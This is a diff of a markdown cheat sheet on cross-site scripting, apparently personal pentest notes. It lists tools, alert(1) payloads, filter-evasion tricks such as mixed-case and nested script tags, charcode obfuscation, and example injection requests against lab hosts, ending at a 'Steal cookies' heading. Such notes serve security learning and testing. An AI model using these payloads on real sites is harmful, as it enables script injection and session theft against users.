@@ -4,45 +4,34 @@ https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet
 https://www.owasp.org/index.php/XSS_(Cross_Site_Scripting)_Prevention_Cheat_Sheet
 https://quanyang.github.io/the-abcs-of-xss/
 
+## Tools
+    OWASP Zed Attack Proxy
 
-### Templates
+    XSSer
+
+    W3Af
+
+### Templates for Client side detection
 List of XSS templates:
 https://gist.github.com/jossets/069ec356de6f73e16b88f07c79728565
 
 
-### Basic
-```html
-<script>alert(1);</script>
-```
 
-### Filter : script tag
+### Embed JS in HTML
+
+````html
+<script>alert(1);</script>
+<img src='zzzz' onerror='alert(1)' />
+<div onmouseover='alert(1)' />, onmouseout, onmousemove, onclick...
+<a href='javascript:alert(1)' /> : Need to click
+````
+
+
+### Avoid simple filters
 ```html
 <sRript>alert(1);</sCript>
-```
-### Remove : script tag
-```html
 <scr<script>ipt>alert(1);</sc</script>ript>
 ```
-
-```
-http://12.0.0.11/xss/example3.php?name=<scr<script>ipt>alert(1);</sc</script>ript>
-http://12.0.0.11/xss/example3.php?name=%3Cscr%3Cscript%3Eipt%3Ealert(1);%3C/sc%3C/script%3Eript%3E
-```
-
-
-### Embed JS
-
-- with the <a tag directly in the URL. You will need to click the link to trigger the JavaScript code.
-```` html
-    <a href='javascript:alert(1)' /> 
-````
-- with the <img> tag and the event onerror.
-```html
-    <img src='zzzz' onerror='alert(1)' />
-```
-- with the <div tag and the following events: onmouseover, onmouseout, onmousemove, onclick...
-
-
 
 
 ### Convert to Ascii code
@@ -51,6 +40,14 @@ https://www.browserling.com/tools/text-to-ascii
 alert(1) => 97,108,101,114,116,40,49,41
 <script>eval(String.fromCharCode( 97,108,101,114,116,40,49,41));</script>
 ````
+
+## How to inject XSS ?
+
+### Get/Post
+```
+GET http://12.0.0.11/xss/example3.php?name=<scr<script>ipt>alert(1);</sc</script>ript>
+```
+
 
 ### PHP : Abusing $_SERVER['PHP_SELF'];
 $_SERVER['PHP_SELF'] = URL base request. 
@@ -71,7 +68,7 @@ GET http://ptl-bf67ed09-7529df2e.libcurl.so/index.php#</script>>script>alert(1)<
 ````
 
 
-## XSS payload client
+## XSS payload : client side
 
 
 ### Steal cookies
